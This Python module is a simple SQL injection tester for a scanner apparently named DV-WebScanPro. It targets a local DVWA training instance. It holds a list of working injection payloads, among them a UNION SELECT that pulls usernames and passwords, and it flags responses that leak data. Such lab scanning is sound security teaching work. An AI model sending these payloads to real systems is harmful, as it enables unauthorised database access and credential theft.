"""
Simple SQL Injection Tester for DV-WebScanPro
Uses the working approach from simple_sqli_test.py
"""

from bs4 import BeautifulSoup
from urllib.parse import quote
from utils.helpers import print_info, print_vuln, print_success, print_error
from utils.http_client import HttpClient

class SimpleSQLiTester:
    """Simple SQL Injection tester that definitely works"""
    
    def __init__(self):
        self.http = HttpClient()
        self.vulnerabilities = []
        
        # Payloads that we KNOW work with DVWA
        self.working_payloads = [
            "1' OR '1'='1",
            "' OR 1=1 --",
            "1' AND '1'='1",
            "1' ORDER BY 1--",
            "1' UNION SELECT user,password FROM users--",
        ]
    
    def login_first(self):
        """Login to DVWA"""
        print_info("Logging into DVWA...")
        return self.http.login_dvwa()
    
    def test_sqli_page(self):
        """Test the SQLi page directly"""
        print_info("\n" + "="*60)
        print_info("TESTING SQL INJECTION")
        print_info("="*60)
        
        sqli_url = "http://localhost/DVWA/vulnerabilities/sqli/"
        
        # Check if page exists
        response = self.http.get(sqli_url)
        if not response or response.status_code != 200:
            print_error("SQLi page not accessible!")
            return False
        
        print_success("SQLi page accessible")
        
        # Test each payload
        for payload in self.working_payloads:
            test_url = f"{sqli_url}?id={quote(payload)}&Submit=Submit"
            print_info(f"\nTrying: {payload}")
            
            response = self.http.get(test_url)
            if not response:
                continue
            
            # Check response text
            response_text = response.text
            
            # Check for successful injection (data returned)
            if "First name:" in response_text and "Surname:" in response_text:
                print_vuln("  ✓✓✓ SQL INJECTION FOUND! ✓✓✓")
                
                # Extract data - look for pre tags or the actual data
                soup = BeautifulSoup(response_text, 'html.parser')
                
                # Try to find data in pre tags
                pre_tags = soup.find_all('pre')
                if pre_tags:
                    for pre in pre_tags:
                        if pre.text.strip():
                            print_info(f"    Data: {pre.text.strip()}")
                else:
                    # If no pre tags, look for the data in the response
                    lines = response_text.split('\n')
                    for line in lines:
                        if "First name:" in line or "Surname:" in line:
                            print_info(f"    {line.strip()}")
                
                # Record vulnerability
                vuln = {
                    'type': 'SQL Injection',
                    'url': sqli_url,
                    'parameter': 'id',
                    'payload': payload,
                    'risk': 'High',
                    'evidence': 'Database data extracted'
                }
                self.vulnerabilities.append(vuln)
                
            elif "First name:" in response_text or "Surname:" in response_text:
                print_vuln("  ✓ SQL INJECTION FOUND (partial data)!")
                vuln = {
                    'type': 'SQL Injection',
                    'url': sqli_url,
                    'parameter': 'id',
                    'payload': payload,
                    'risk': 'High',
                    'evidence': 'Partial data extracted'
                }
                self.vulnerabilities.append(vuln)
                
            elif "mysql" in response_text.lower() or "sql" in response_text.lower():
                print_vuln("  ✓ SQL ERROR DETECTED - Likely vulnerable")
                vuln = {
                    'type': 'SQL Injection (Error Based)',
                    'url': sqli_url,
                    'parameter': 'id',
                    'payload': payload,
                    'risk': 'Medium',
                    'evidence': 'SQL error message'
                }
                self.vulnerabilities.append(vuln)
            else:
                print_info("  No injection detected")
        
        return len(self.vulnerabilities) > 0
    
    def run_tests(self):
        """Run all tests"""
        if self.login_first():
            self.test_sqli_page()
            
            print_info("\n" + "="*60)
            print_info("RESULTS SUMMARY")
            print_info("="*60)
            
            if self.vulnerabilities:
                print_vuln(f"Found {len(self.vulnerabilities)} SQL injection vulnerabilities!")
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    print_info(f"{i}. {vuln['payload']} - {vuln['type']}")
            else:
                print_info("No vulnerabilities found")
            
            return self.vulnerabilities
        else:
            print_error("Login failed")
            return []